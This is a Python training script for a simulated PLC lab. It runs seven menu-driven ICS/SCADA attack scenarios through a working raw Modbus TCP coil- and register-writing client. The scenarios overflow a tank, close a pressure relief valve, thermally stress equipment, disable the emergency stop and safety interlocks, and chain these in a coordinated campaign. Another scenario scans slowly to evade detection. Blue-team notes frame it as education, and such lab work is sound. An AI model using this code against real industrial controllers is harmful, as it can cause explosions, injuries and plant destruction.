#!/usr/bin/env python3
"""
Realistic ICS/SCADA Attack Scenarios for Training
Covers various attack types targeting industrial control systems
"""
import socket
import struct
import time
import random
from datetime import datetime

class Color:
    """ANSI color codes for terminal output"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'

class ModbusAttacker:
    """Modbus TCP attack framework for training scenarios"""

    def __init__(self, host='127.0.0.1'):
        self.host = host
        self.ports = {
            'PLC-1': 5502,  # Tank Control
            'PLC-2': 5503,  # Pressure Control
            'PLC-3': 5504,  # Temperature Control
            'PLC-4': 5505   # Safety System
        }

    def write_coil(self, port, coil, value, desc=""):
        """Execute Modbus Write Single Coil (0x05)"""
        try:
            sock = socket.socket()
            sock.settimeout(2)
            sock.connect((self.host, port))

            coil_value = 0xFF00 if value else 0x0000
            request = struct.pack('>HHHB', 1, 0, 6, 1) + struct.pack('>BHH', 0x05, coil, coil_value)

            sock.send(request)
            response = sock.recv(1024)
            sock.close()

            success = len(response) >= 12 and response[7] == 0x05
            return success
        except Exception as e:
            return False

    def write_register(self, port, register, value, desc=""):
        """Execute Modbus Write Single Register (0x06)"""
        try:
            sock = socket.socket()
            sock.settimeout(2)
            sock.connect((self.host, port))

            request = struct.pack('>HHHB', 1, 0, 6, 1) + struct.pack('>BHH', 0x06, register, value)

            sock.send(request)
            response = sock.recv(1024)
            sock.close()

            success = len(response) >= 12 and response[7] == 0x06
            return success
        except Exception as e:
            return False


# ═══════════════════════════════════════════════════════════════════════════
# SCENARIO 1: Reconnaissance - System Discovery
# ═══════════════════════════════════════════════════════════════════════════

def scenario_reconnaissance():
    """
    SCENARIO: Initial Reconnaissance

    Objective: Discover and profile ICS systems
    Difficulty: Beginner
    Attack Type: Passive/Active Reconnaissance

    Learning Goals:
    - Understand ICS network discovery
    - Learn Modbus port scanning
    - Practice fingerprinting PLCs
    """
    print(f"\n{Color.HEADER}{'═'*71}{Color.END}")
    print(f"{Color.HEADER}SCENARIO 1: Reconnaissance - System Discovery{Color.END}")
    print(f"{Color.HEADER}{'═'*71}{Color.END}\n")

    print(f"{Color.BOLD}Objective:{Color.END} Discover active PLCs on the network")
    print(f"{Color.BOLD}Difficulty:{Color.END} {Color.GREEN}Beginner{Color.END}")
    print(f"{Color.BOLD}MITRE ATT&CK:{Color.END} T0840 - Network Connection Enumeration\n")

    attacker = ModbusAttacker()

    print(f"{Color.CYAN}[*] Scanning for Modbus TCP devices...{Color.END}\n")

    discovered = []
    for plc_name, port in attacker.ports.items():
        try:
            sock = socket.socket()
            sock.settimeout(1)
            sock.connect((attacker.host, port))
            sock.close()
            discovered.append((plc_name, port))
            print(f"  {Color.GREEN}✓{Color.END} Found {plc_name} on port {port}")
        except:
            print(f"  {Color.RED}✗{Color.END} No response on port {port}")

    print(f"\n{Color.BOLD}Results:{Color.END}")
    print(f"  Discovered {len(discovered)} active PLCs")
    print(f"\n{Color.YELLOW}[!] Blue Team Detection:{Color.END}")
    print(f"  • Port scanning activity detected")
    print(f"  • Multiple connection attempts logged")
    print(f"  • IDS should flag reconnaissance behavior")


# ═══════════════════════════════════════════════════════════════════════════
# SCENARIO 2: Tank Overflow Attack (PLC-1)
# ═══════════════════════════════════════════════════════════════════════════

def scenario_tank_overflow():
    """
    SCENARIO: Tank Overflow Attack

    Objective: Cause tank overflow by manipulating pump and valve controls
    Difficulty: Intermediate
    Attack Type: Process Manipulation
    Target: PLC-1 (Tank Control System)

    Real-World Parallel: Similar to attacks on water treatment facilities
    """
    print(f"\n{Color.HEADER}{'═'*71}{Color.END}")
    print(f"{Color.HEADER}SCENARIO 2: Tank Overflow Attack (PLC-1){Color.END}")
    print(f"{Color.HEADER}{'═'*71}{Color.END}\n")

    print(f"{Color.BOLD}Objective:{Color.END} Cause tank overflow")
    print(f"{Color.BOLD}Difficulty:{Color.END} {Color.YELLOW}Intermediate{Color.END}")
    print(f"{Color.BOLD}Target:{Color.END} PLC-1 (Tank Control System)")
    print(f"{Color.BOLD}MITRE ATT&CK:{Color.END} T0836 - Modify Parameter\n")

    print(f"{Color.BOLD}Attack Scenario:{Color.END}")
    print(f"  1. Turn ON pump (coil 0) → Fill tank")
    print(f"  2. Close outlet valve (coil 3) → Prevent drainage")
    print(f"  3. Result: Tank level rises uncontrollably\n")

    attacker = ModbusAttacker()

    input(f"{Color.CYAN}Press Enter to execute attack...{Color.END}")

    print(f"\n{Color.RED}[!] Executing Tank Overflow Attack...{Color.END}\n")

    # Step 1: Enable pump
    print(f"  {Color.CYAN}[1/2]{Color.END} Turning ON pump (coil 0)...")
    success = attacker.write_coil(5502, 0, True, "Pump ON")
    print(f"  {'✓' if success else '✗'} Pump control: {'SUCCESS' if success else 'FAILED'}")
    time.sleep(1)

    # Step 2: Close outlet valve
    print(f"  {Color.CYAN}[2/2]{Color.END} Closing outlet valve (coil 3)...")
    success = attacker.write_coil(5502, 3, False, "Valve closed")
    print(f"  {'✓' if success else '✗'} Valve control: {'SUCCESS' if success else 'FAILED'}")

    print(f"\n{Color.RED}[!] Tank Overflow Attack Complete!{Color.END}")
    print(f"\n{Color.BOLD}Expected Impact:{Color.END}")
    print(f"  • Tank level rises uncontrollably")
    print(f"  • High-level alarms triggered")
    print(f"  • Potential physical damage to tank")
    print(f"  • Production downtime")

    print(f"\n{Color.YELLOW}[!] Blue Team Detection:{Color.END}")
    print(f"  • Write operations to critical coils")
    print(f"  • Abnormal process values detected")
    print(f"  • Safety system alarms")


# ═══════════════════════════════════════════════════════════════════════════
# SCENARIO 3: Pressure Vessel Rupture (PLC-2)
# ═══════════════════════════════════════════════════════════════════════════

def scenario_pressure_rupture():
    """
    SCENARIO: Pressure Vessel Rupture Attack

    Objective: Over-pressurize vessel by disabling safety controls
    Difficulty: Advanced
    Attack Type: Safety System Sabotage
    Target: PLC-2 (Pressure Control System)

    Real-World Parallel: Similar to Triton/TRISIS attack on safety systems
    """
    print(f"\n{Color.HEADER}{'═'*71}{Color.END}")
    print(f"{Color.HEADER}SCENARIO 3: Pressure Vessel Rupture Attack (PLC-2){Color.END}")
    print(f"{Color.HEADER}{'═'*71}{Color.END}\n")

    print(f"{Color.BOLD}Objective:{Color.END} Over-pressurize vessel")
    print(f"{Color.BOLD}Difficulty:{Color.END} {Color.RED}Advanced{Color.END}")
    print(f"{Color.BOLD}Target:{Color.END} PLC-2 (Pressure Control System)")
    print(f"{Color.BOLD}MITRE ATT&CK:{Color.END} T0816 - Device Restart/Shutdown\n")

    print(f"{Color.BOLD}Attack Scenario:{Color.END}")
    print(f"  1. Enable compressor (coil 0) → Increase pressure")
    print(f"  2. Close relief valve (coil 4) → Disable safety relief")
    print(f"  3. Result: Pressure builds beyond safe limits\n")

    attacker = ModbusAttacker()

    input(f"{Color.CYAN}Press Enter to execute attack...{Color.END}")

    print(f"\n{Color.RED}[!] Executing Pressure Rupture Attack...{Color.END}\n")

    # Step 1: Enable compressor
    print(f"  {Color.CYAN}[1/2]{Color.END} Enabling compressor (coil 0)...")
    success = attacker.write_coil(5503, 0, True, "Compressor ON")
    print(f"  {'✓' if success else '✗'} Compressor control: {'SUCCESS' if success else 'FAILED'}")
    time.sleep(1)

    # Step 2: Close relief valve
    print(f"  {Color.CYAN}[2/2]{Color.END} Closing relief valve (coil 4)...")
    success = attacker.write_coil(5503, 4, False, "Relief valve closed")
    print(f"  {'✓' if success else '✗'} Relief valve control: {'SUCCESS' if success else 'FAILED'}")

    print(f"\n{Color.RED}[!] Pressure Rupture Attack Complete!{Color.END}")
    print(f"\n{Color.BOLD}Expected Impact:{Color.END}")
    print(f"  • {Color.RED}CRITICAL:{Color.END} Pressure exceeds safe limits")
    print(f"  • Risk of vessel rupture/explosion")
    print(f"  • Safety systems bypassed")
    print(f"  • Potential for casualties")

    print(f"\n{Color.YELLOW}[!] Blue Team Detection:{Color.END}")
    print(f"  • CRITICAL alerts for safety system tampering")
    print(f"  • Relief valve closure during high pressure")
    print(f"  • Emergency shutdown procedures triggered")


# ═══════════════════════════════════════════════════════════════════════════
# SCENARIO 4: Temperature Stress Attack (PLC-3)
# ═══════════════════════════════════════════════════════════════════════════

def scenario_temperature_stress():
    """
    SCENARIO: Thermal Stress Attack

    Objective: Cause equipment damage through thermal cycling
    Difficulty: Intermediate
    Attack Type: Equipment Degradation
    Target: PLC-3 (Temperature Control System)

    Real-World Parallel: Stuxnet-style equipment degradation
    """
    print(f"\n{Color.HEADER}{'═'*71}{Color.END}")
    print(f"{Color.HEADER}SCENARIO 4: Thermal Stress Attack (PLC-3){Color.END}")
    print(f"{Color.HEADER}{'═'*71}{Color.END}\n")

    print(f"{Color.BOLD}Objective:{Color.END} Cause equipment damage via thermal cycling")
    print(f"{Color.BOLD}Difficulty:{Color.END} {Color.YELLOW}Intermediate{Color.END}")
    print(f"{Color.BOLD}Target:{Color.END} PLC-3 (Temperature Control System)")
    print(f"{Color.BOLD}MITRE ATT&CK:{Color.END} T0879 - Damage to Property\n")

    print(f"{Color.BOLD}Attack Scenario:{Color.END}")
    print(f"  1. Rapid heating/cooling cycles")
    print(f"  2. Causes thermal stress on equipment")
    print(f"  3. Result: Accelerated equipment degradation\n")

    attacker = ModbusAttacker()

    input(f"{Color.CYAN}Press Enter to execute attack (3 cycles)...{Color.END}")

    print(f"\n{Color.RED}[!] Executing Thermal Stress Attack...{Color.END}\n")

    for cycle in range(3):
        print(f"{Color.BOLD}Cycle {cycle + 1}/3:{Color.END}")

        # Heat
        print(f"  {Color.CYAN}[→]{Color.END} Enabling heater (coil 0)...")
        attacker.write_coil(5504, 0, True, "Heater ON")
        print(f"  {Color.RED}[HOT]{Color.END} Temperature rising...")
        time.sleep(2)

        # Cool
        print(f"  {Color.CYAN}[→]{Color.END} Enabling cooler (coil 2)...")
        attacker.write_coil(5504, 2, True, "Cooler ON")
        print(f"  {Color.BLUE}[COLD]{Color.END} Temperature dropping...")
        time.sleep(2)
        print()

    print(f"{Color.RED}[!] Thermal Stress Attack Complete!{Color.END}")
    print(f"\n{Color.BOLD}Expected Impact:{Color.END}")
    print(f"  • Thermal shock to equipment")
    print(f"  • Accelerated wear and tear")
    print(f"  • Reduced equipment lifespan")
    print(f"  • Maintenance costs increase")

    print(f"\n{Color.YELLOW}[!] Blue Team Detection:{Color.END}")
    print(f"  • Abnormal temperature fluctuations")
    print(f"  • Rapid setpoint changes")
    print(f"  • Process deviation alarms")


# ═══════════════════════════════════════════════════════════════════════════
# SCENARIO 5: Safety System Shutdown (PLC-4)
# ═══════════════════════════════════════════════════════════════════════════

def scenario_safety_shutdown():
    """
    SCENARIO: Emergency Safety System Disable

    Objective: Disable emergency shutdown capabilities
    Difficulty: Expert
    Attack Type: Safety System Compromise
    Target: PLC-4 (Safety/Emergency Shutdown System)

    Real-World Parallel: Triton/TRISIS attack methodology
    """
    print(f"\n{Color.HEADER}{'═'*71}{Color.END}")
    print(f"{Color.HEADER}SCENARIO 5: Emergency Safety System Disable (PLC-4){Color.END}")
    print(f"{Color.HEADER}{'═'*71}{Color.END}\n")

    print(f"{Color.BOLD}Objective:{Color.END} Disable emergency safety controls")
    print(f"{Color.BOLD}Difficulty:{Color.END} {Color.RED}{Color.BOLD}Expert{Color.END}")
    print(f"{Color.BOLD}Target:{Color.END} PLC-4 (Safety/Emergency Shutdown System)")
    print(f"{Color.BOLD}MITRE ATT&CK:{Color.END} T0816 - Device Restart/Shutdown\n")

    print(f"{Color.BOLD}Attack Scenario:{Color.END}")
    print(f"  1. Disable emergency stop (coil 0)")
    print(f"  2. Disable safety interlock (coil 1)")
    print(f"  3. Result: No safety systems to prevent catastrophe\n")

    print(f"{Color.RED}{Color.BOLD}⚠️  WARNING: This is the most dangerous attack!{Color.END}")
    print(f"{Color.RED}   Disabling safety systems can lead to catastrophic failure.{Color.END}\n")

    attacker = ModbusAttacker()

    confirm = input(f"{Color.YELLOW}Type 'CONFIRM' to execute this critical attack: {Color.END}")

    if confirm != "CONFIRM":
        print(f"\n{Color.GREEN}[✓] Attack cancelled. Good judgment!{Color.END}")
        return

    print(f"\n{Color.RED}[!] Executing Safety System Disable Attack...{Color.END}\n")

    # Disable E-stop
    print(f"  {Color.CYAN}[1/2]{Color.END} Disabling emergency stop (coil 0)...")
    success = attacker.write_coil(5505, 0, False, "E-stop disabled")
    print(f"  {Color.RED}✗{Color.END} Emergency stop: {'DISABLED' if success else 'FAILED'}")
    time.sleep(1)

    # Disable interlock
    print(f"  {Color.CYAN}[2/2]{Color.END} Disabling safety interlock (coil 1)...")
    success = attacker.write_coil(5505, 1, False, "Interlock disabled")
    print(f"  {Color.RED}✗{Color.END} Safety interlock: {'DISABLED' if success else 'FAILED'}")

    print(f"\n{Color.RED}{Color.BOLD}[!!!] SAFETY SYSTEMS DISABLED [!!!]{Color.END}")
    print(f"\n{Color.BOLD}Expected Impact:{Color.END}")
    print(f"  • {Color.RED}{Color.BOLD}CRITICAL:{Color.END} No emergency stop capability")
    print(f"  • {Color.RED}{Color.BOLD}CRITICAL:{Color.END} Safety interlocks bypassed")
    print(f"  • Plant cannot be safely shut down")
    print(f"  • Other attacks now more dangerous")

    print(f"\n{Color.YELLOW}[!] Blue Team Detection:{Color.END}")
    print(f"  • {Color.RED}MAXIMUM PRIORITY ALERT{Color.END}")
    print(f"  • Safety system tampering detected")
    print(f"  • Immediate incident response required")
    print(f"  • Consider emergency plant shutdown")


# ═══════════════════════════════════════════════════════════════════════════
# SCENARIO 6: Multi-Stage Advanced Persistent Threat (APT)
# ═══════════════════════════════════════════════════════════════════════════

def scenario_apt_campaign():
    """
    SCENARIO: Multi-Stage APT Campaign

    Objective: Execute coordinated attack across all PLCs
    Difficulty: Expert
    Attack Type: Advanced Persistent Threat
    Target: All PLCs (Coordinated Attack)

    Real-World Parallel: Nation-state APT campaigns
    """
    print(f"\n{Color.HEADER}{'═'*71}{Color.END}")
    print(f"{Color.HEADER}SCENARIO 6: Multi-Stage APT Campaign{Color.END}")
    print(f"{Color.HEADER}{'═'*71}{Color.END}\n")

    print(f"{Color.BOLD}Objective:{Color.END} Coordinated attack across all systems")
    print(f"{Color.BOLD}Difficulty:{Color.END} {Color.RED}{Color.BOLD}Expert{Color.END}")
    print(f"{Color.BOLD}Target:{Color.END} All PLCs (System-Wide)")
    print(f"{Color.BOLD}MITRE ATT&CK:{Color.END} Multiple Techniques\n")

    print(f"{Color.BOLD}Attack Timeline:{Color.END}")
    print(f"  Phase 1: Disable safety systems (PLC-4)")
    print(f"  Phase 2: Overflow tank (PLC-1)")
    print(f"  Phase 3: Over-pressurize (PLC-2)")
    print(f"  Phase 4: Thermal damage (PLC-3)")
    print(f"  Result: Cascading system failure\n")

    attacker = ModbusAttacker()

    confirm = input(f"{Color.RED}{Color.BOLD}Type 'EXECUTE APT' to begin coordinated attack: {Color.END}")

    if confirm != "EXECUTE APT":
        print(f"\n{Color.GREEN}[✓] APT campaign cancelled.{Color.END}")
        return

    print(f"\n{Color.RED}[!] Initiating Multi-Stage APT Campaign...{Color.END}\n")

    # Phase 1: Disable safety
    print(f"{Color.BOLD}PHASE 1: Disabling Safety Systems...{Color.END}")
    attacker.write_coil(5505, 0, False, "E-stop OFF")
    attacker.write_coil(5505, 1, False, "Interlock OFF")
    print(f"  {Color.RED}✗{Color.END} PLC-4 safety systems disabled")
    time.sleep(2)

    # Phase 2: Tank overflow
    print(f"\n{Color.BOLD}PHASE 2: Initiating Tank Overflow...{Color.END}")
    attacker.write_coil(5502, 0, True, "Pump ON")
    attacker.write_coil(5502, 3, False, "Valve closed")
    print(f"  {Color.YELLOW}⚠{Color.END}  PLC-1 tank overflow in progress")
    time.sleep(2)

    # Phase 3: Pressure attack
    print(f"\n{Color.BOLD}PHASE 3: Over-Pressurizing System...{Color.END}")
    attacker.write_coil(5503, 0, True, "Compressor ON")
    attacker.write_coil(5503, 4, False, "Relief closed")
    print(f"  {Color.RED}⚠{Color.END}  PLC-2 pressure building dangerously")
    time.sleep(2)

    # Phase 4: Thermal stress
    print(f"\n{Color.BOLD}PHASE 4: Initiating Thermal Stress...{Color.END}")
    attacker.write_coil(5504, 0, True, "Heater ON")
    attacker.write_coil(5504, 2, True, "Cooler ON")
    print(f"  {Color.YELLOW}⚠{Color.END}  PLC-3 thermal stress initiated")

    print(f"\n{Color.RED}{Color.BOLD}{'═'*71}{Color.END}")
    print(f"{Color.RED}{Color.BOLD}[!!!] APT CAMPAIGN COMPLETE - SYSTEM FAILURE IMMINENT [!!!]{Color.END}")
    print(f"{Color.RED}{Color.BOLD}{'═'*71}{Color.END}")

    print(f"\n{Color.BOLD}Expected Impact:{Color.END}")
    print(f"  • Complete loss of safety systems")
    print(f"  • Multiple simultaneous process failures")
    print(f"  • Cascading equipment damage")
    print(f"  • Potential for catastrophic incident")
    print(f"  • Extended recovery time (days/weeks)")

    print(f"\n{Color.YELLOW}[!] Blue Team Response:{Color.END}")
    print(f"  • Declare security incident")
    print(f"  • Emergency plant shutdown")
    print(f"  • Isolate OT network from IT")
    print(f"  • Begin forensic investigation")
    print(f"  • Notify authorities/regulatory bodies")


# ═══════════════════════════════════════════════════════════════════════════
# SCENARIO 7: Stealthy Reconnaissance with Minimal Footprint
# ═══════════════════════════════════════════════════════════════════════════

def scenario_stealthy_recon():
    """
    SCENARIO: Stealthy Reconnaissance

    Objective: Gather intelligence without triggering alarms
    Difficulty: Intermediate
    Attack Type: Covert Intelligence Gathering

    Learning: How attackers avoid detection during reconnaissance
    """
    print(f"\n{Color.HEADER}{'═'*71}{Color.END}")
    print(f"{Color.HEADER}SCENARIO 7: Stealthy Reconnaissance{Color.END}")
    print(f"{Color.HEADER}{'═'*71}{Color.END}\n")

    print(f"{Color.BOLD}Objective:{Color.END} Gather system information covertly")
    print(f"{Color.BOLD}Difficulty:{Color.END} {Color.YELLOW}Intermediate{Color.END}")
    print(f"{Color.BOLD}MITRE ATT&CK:{Color.END} T0888 - Remote System Information Discovery\n")

    print(f"{Color.BOLD}Stealth Techniques:{Color.END}")
    print(f"  • Slow scanning (avoid rate-based detection)")
    print(f"  • Read-only operations (no process changes)")
    print(f"  • Randomized timing (avoid pattern detection)")
    print(f"  • Legitimate-looking requests\n")

    attacker = ModbusAttacker()

    input(f"{Color.CYAN}Press Enter to begin stealthy reconnaissance...{Color.END}")

    print(f"\n{Color.CYAN}[*] Conducting stealthy reconnaissance...{Color.END}\n")

    for plc_name, port in attacker.ports.items():
        wait_time = random.uniform(3, 8)
        print(f"  {Color.CYAN}[→]{Color.END} Probing {plc_name}...")
        time.sleep(wait_time)

        try:
            sock = socket.socket()
            sock.settimeout(2)
            sock.connect((attacker.host, port))
            sock.close()
            print(f"      {Color.GREEN}✓{Color.END} {plc_name} active on port {port} (waited {wait_time:.1f}s)")
        except:
            print(f"      {Color.RED}✗{Color.END} No response")

    print(f"\n{Color.GREEN}[✓] Reconnaissance Complete{Color.END}")
    print(f"\n{Color.BOLD}Intelligence Gathered:{Color.END}")
    print(f"  • Network topology mapped")
    print(f"  • PLC types identified")
    print(f"  • Attack surface analyzed")

    print(f"\n{Color.YELLOW}[!] Blue Team Detection:{Color.END}")
    print(f"  • {Color.GREEN}LOW{Color.END} - Stealthy approach reduces detection")
    print(f"  • Slow scan may blend with normal traffic")
    print(f"  • Long-term behavioral analysis needed")


# ═══════════════════════════════════════════════════════════════════════════
# Main Menu
# ═══════════════════════════════════════════════════════════════════════════

def print_menu():
    print(f"\n{Color.BOLD}{Color.CYAN}{'═'*71}{Color.END}")
    print(f"{Color.BOLD}{Color.CYAN}ICS/SCADA ATTACK TRAINING SCENARIOS{Color.END}")
    print(f"{Color.BOLD}{Color.CYAN}{'═'*71}{Color.END}\n")

    print(f"{Color.BOLD}Choose a training scenario:{Color.END}\n")

    scenarios = [
        ("1", "Reconnaissance - System Discovery", "Beginner", Color.GREEN),
        ("2", "Tank Overflow Attack (PLC-1)", "Intermediate", Color.YELLOW),
        ("3", "Pressure Vessel Rupture (PLC-2)", "Advanced", Color.RED),
        ("4", "Thermal Stress Attack (PLC-3)", "Intermediate", Color.YELLOW),
        ("5", "Safety System Shutdown (PLC-4)", "Expert", Color.RED),
        ("6", "Multi-Stage APT Campaign", "Expert", Color.RED),
        ("7", "Stealthy Reconnaissance", "Intermediate", Color.YELLOW),
    ]

    for num, name, difficulty, color in scenarios:
        print(f"  {Color.BOLD}[{num}]{Color.END} {name}")
        print(f"      Difficulty: {color}{difficulty}{Color.END}\n")

    print(f"  {Color.BOLD}[0]{Color.END} Exit\n")


def main():
    print(f"\n{Color.BOLD}{'═'*71}{Color.END}")
    print(f"{Color.BOLD}Vuln-PLC Training Scenarios{Color.END}")
    print(f"{Color.BOLD}For Educational Purposes Only{Color.END}")
    print(f"{Color.BOLD}{'═'*71}{Color.END}")

    scenarios = {
        '1': scenario_reconnaissance,
        '2': scenario_tank_overflow,
        '3': scenario_pressure_rupture,
        '4': scenario_temperature_stress,
        '5': scenario_safety_shutdown,
        '6': scenario_apt_campaign,
        '7': scenario_stealthy_recon,
    }

    while True:
        print_menu()
        choice = input(f"{Color.CYAN}Select scenario: {Color.END}").strip()

        if choice == '0':
            print(f"\n{Color.GREEN}Training session ended.{Color.END}\n")
            break
        elif choice in scenarios:
            scenarios[choice]()
            input(f"\n{Color.CYAN}Press Enter to return to menu...{Color.END}")
        else:
            print(f"\n{Color.RED}Invalid choice. Please try again.{Color.END}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Color.YELLOW}Training interrupted by user.{Color.END}\n")
